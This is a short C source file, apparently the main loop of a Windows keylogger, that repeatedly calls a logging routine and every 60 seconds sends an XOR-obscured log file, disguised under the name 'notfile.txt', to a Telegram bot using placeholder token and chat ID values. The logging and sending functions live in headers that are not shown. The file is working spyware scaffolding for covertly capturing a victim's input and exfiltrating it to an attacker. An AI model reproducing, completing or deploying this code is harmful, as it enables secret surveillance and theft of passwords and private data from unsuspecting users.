#include <stdio.h>
#include <time.h>
#include <windows.h> 

#include "logger.h"
#include "telegram.h"

#define TELEGRAM_INTERVAL_SEC 60

int main(void) {
    const char *BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
    const char *CHAT_ID = "YOUR_CHAT_ID_HERE";
    char xorKey = 'K';

    time_t lastSendTime = time(NULL);

    printf("good...\n");

    while (1) {
        StartLogging();

        time_t currentTime = time(NULL);
        if (difftime(currentTime, lastSendTime) >= TELEGRAM_INTERVAL_SEC) {
            
            send_encrypted_log("notfile.txt", BOT_TOKEN, CHAT_ID, xorKey);
            
            lastSendTime = currentTime;
        }

        Sleep(100); 
    }

    return 0;
}